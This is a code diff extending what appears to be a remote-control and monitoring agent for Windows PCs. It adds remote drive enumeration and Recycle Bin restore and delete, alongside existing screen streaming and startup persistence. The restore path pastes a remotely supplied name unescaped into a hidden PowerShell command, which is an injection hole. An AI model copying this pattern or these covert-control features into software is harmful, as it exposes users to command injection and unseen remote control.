@@ -279,6 +279,7 @@ class BackgroundWorkerAgent:
         relay_url = self.config.get("relay_url", DEFAULT_RELAY_URL).rstrip("/")
         ping_url = f"{relay_url}/api/ping"
         res_str = f"{self.mon_width}x{self.mon_height}"
+        failed_pings = 0
 
         while self.is_running:
             payload = {
@@ -305,6 +306,7 @@ class BackgroundWorkerAgent:
                     timeout=3
                 )
                 if resp.status_code == 200:
+                    failed_pings = 0
                     res = resp.json()
                     self.last_ping_ms = int((time.time() - t0) * 1000)
                     self.is_connected = True
@@ -339,11 +341,15 @@ class BackgroundWorkerAgent:
                             self.tray_icon.notify(guidance, title="CEO Guidance Instruction")
                         except Exception:
                             pass
+                else:
+                    failed_pings += 1
             except Exception:
-                self.is_connected = False
-                self.update_tray_state("idle", "Reconnecting to Relay...")
+                failed_pings += 1
+                if failed_pings >= 3:
+                    self.is_connected = False
+                    self.update_tray_state("idle", "Reconnecting to Relay...")
 
-            time.sleep(1.8)
+            time.sleep(1.2)
 
     def stream_loop(self):
         """Ultra-fast SIMD OpenCV screen capture and streaming loop"""
@@ -510,6 +516,10 @@ class BackgroundWorkerAgent:
                             self.handle_list_trash(result_url)
                         elif action == "empty_trash":
                             self.handle_empty_trash(result_url)
+                        elif action == "restore_trash":
+                            self.handle_restore_trash(file_name or req_path, result_url)
+                        elif action == "delete_trash_item":
+                            self.handle_delete_trash_item(file_name or req_path, result_url)
                         elif action == "notepad_open":
                             self.start_live_notepad(cmd_text)
                         elif action == "notepad_update":
@@ -519,9 +529,9 @@ class BackgroundWorkerAgent:
                         elif action == "autostart":
                             self.handle_autostart_command(result_url)
 
-                time.sleep(0.4)
+                time.sleep(0.12)
             except Exception:
-                time.sleep(1.0)
+                time.sleep(0.5)
 
     def handle_autostart_command(self, result_url):
         """Remotely ensures the worker is persistent in %LOCALAPPDATA% and registered in Windows Startup"""
@@ -539,12 +549,14 @@ class BackgroundWorkerAgent:
             pass
 
     def resolve_path(self, target_path):
-        """Resolves friendly shortcuts like DEFAULT, DESKTOP, DOCUMENTS, DOWNLOADS"""
+        """Resolves friendly shortcuts like DEFAULT, DESKTOP, DOCUMENTS, DOWNLOADS, THIS_PC"""
         if not target_path or target_path in ("DEFAULT", "DESKTOP"):
             p = os.path.join(os.path.expanduser("~"), "Desktop")
             if not os.path.exists(p):
                 p = os.path.expanduser("~")
             return p
+        elif target_path in ("THIS_PC", "MY_COMPUTER"):
+            return "THIS_PC"
         elif target_path == "DOCUMENTS":
             return os.path.join(os.path.expanduser("~"), "Documents")
         elif target_path == "DOWNLOADS":
@@ -559,6 +571,10 @@ class BackgroundWorkerAgent:
             return
 
         target_path = self.resolve_path(target_path)
+        if target_path == "THIS_PC":
+            self.handle_list_this_pc(result_url)
+            return
+
         items = []
 
         try:
@@ -905,6 +921,155 @@ class BackgroundWorkerAgent:
             self.http_session.post(result_url, json=payload, timeout=3.0)
         except Exception:
             pass
+
+    def handle_list_this_pc(self, result_url):
+        """Lists all local hard drives, SSDs, and removable/movable disks on the worker PC"""
+        drives = []
+        try:
+            import ctypes
+            import string
+
+            bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+            for letter in string.ascii_uppercase:
+                if bitmask & 1:
+                    drive_str = f"{letter}:\\"
+                    dtype = ctypes.windll.kernel32.GetDriveTypeW(drive_str)
+                    # 2: DRIVE_REMOVABLE, 3: DRIVE_FIXED, 4: DRIVE_REMOTE, 5: DRIVE_CDROM, 6: DRIVE_RAMDISK
+                    if dtype == 2:
+                        type_name = "Removable Disk (USB)"
+                        icon = "💾"
+                    elif dtype == 3:
+                        type_name = "Local Disk"
+                        icon = "💽"
+                    elif dtype == 4:
+                        type_name = "Network Drive"
+                        icon = "🌐"
+                    elif dtype == 5:
+                        type_name = "CD/DVD Drive"
+                        icon = "💿"
+                    else:
+                        type_name = "Disk Drive"
+                        icon = "💽"
+
+                    # Free & total capacity
+                    free_bytes = ctypes.c_ulonglong(0)
+                    total_bytes = ctypes.c_ulonglong(0)
+                    total_free = ctypes.c_ulonglong(0)
+                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(
+                        drive_str,
+                        ctypes.byref(free_bytes),
+                        ctypes.byref(total_bytes),
+                        ctypes.byref(total_free)
+                    )
+                    total_gb = total_bytes.value / (1024**3)
+                    free_gb = free_bytes.value / (1024**3)
+
+                    vol_buf = ctypes.create_unicode_buffer(512)
+                    ctypes.windll.kernel32.GetVolumeInformationW(
+                        drive_str, vol_buf, ctypes.sizeof(vol_buf),
+                        None, None, None, None, 0
+                    )
+                    vol_label = vol_buf.value.strip() or type_name
+                    space_desc = f"{free_gb:.1f} GB free of {total_gb:.1f} GB" if total_gb > 0 else type_name
+
+                    drives.append({
+                        "name": f"{vol_label} ({letter}:)",
+                        "path": drive_str,
+                        "isDir": True,
+                        "isDrive": True,
+                        "driveType": type_name,
+                        "icon": icon,
+                        "size": total_bytes.value,
+                        "sizeStr": space_desc,
+                        "modified": int(time.time() * 1000)
+                    })
+                bitmask >>= 1
+        except Exception:
+            pass
+
+        payload = {
+            "workerId": self.worker_id,
+            "action": "list",
+            "currentPath": "THIS_PC",
+            "items": drives,
+            "statusMessage": f"This PC: {len(drives)} drive(s) detected (Hard & Removable disks)",
+            "success": True,
+            "timestamp": int(time.time() * 1000)
+        }
+        try:
+            self.http_session.post(result_url, json=payload, timeout=3.0)
+        except Exception:
+            pass
+
+    def handle_restore_trash(self, target_name, result_url):
+        """Restores an item from the Windows Recycle Bin back to its original location"""
+        restored = False
+        status_msg = ""
+        try:
+            import win32com.client
+            shell = win32com.client.Dispatch("Shell.Application")
+            rb = shell.NameSpace(10) # ssfBITBUCKET
+            count = rb.Items().Count
+            for i in range(count):
+                it = rb.Items().Item(i)
+                if it.Name == target_name or target_name in str(it.Path):
+                    for v in it.Verbs():
+                        vname = v.Name.lower()
+                        if "estore" in vname or "restaur" in vname or "wiederherstellen" in vname or "restaurar" in vname:
+                            v.DoIt()
+                            restored = True
+                            status_msg = f"Successfully restored '{target_name}' to its original location."
+                            break
+                    if restored:
+                        break
+        except Exception as e:
+            status_msg = f"Error restoring item: {str(e)}"
+
+        if not restored and not status_msg:
+            try:
+                ps_script = f"""
+                $shell = New-Object -ComObject Shell.Application
+                $rb = $shell.Namespace(10)
+                foreach ($item in $rb.Items()) {{
+                    if ($item.Name -eq '{target_name}') {{
+                        foreach ($verb in $item.Verbs()) {{
+                            if ($verb.Name -like '*estore*') {{
+                                $verb.DoIt()
+                                exit 0
+                            }}
+                        }}
+                    }}
+                }}
+                """
+                subprocess.run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script], timeout=5)
+                restored = True
+                status_msg = f"Restored '{target_name}' to original location."
+            except Exception as e:
+                status_msg = f"Failed to restore: {e}"
+
+        time.sleep(0.3)
+        self.handle_list_trash(result_url)
+
+    def handle_delete_trash_item(self, target_name, result_url):
+        """Permanently deletes a single item from the Windows Recycle Bin"""
+        try:
+            import win32com.client
+            shell = win32com.client.Dispatch("Shell.Application")
+            rb = shell.NameSpace(10)
+            count = rb.Items().Count
+            for i in range(count):
+                it = rb.Items().Item(i)
+                if it.Name == target_name or target_name in str(it.Path):
+                    for v in it.Verbs():
+                        vname = v.Name.lower()
+                        if "delete" in vname or "supprimer" in vname or "löschen" in vname or "eliminar" in vname:
+                            v.DoIt()
+                            break
+                    break
+        except Exception:
+            pass
+        time.sleep(0.3)
+        self.handle_list_trash(result_url)
 
     def handle_make_directory(self, parent_dir, new_folder_name, result_url):
         """Creates a new folder on worker's PC"""
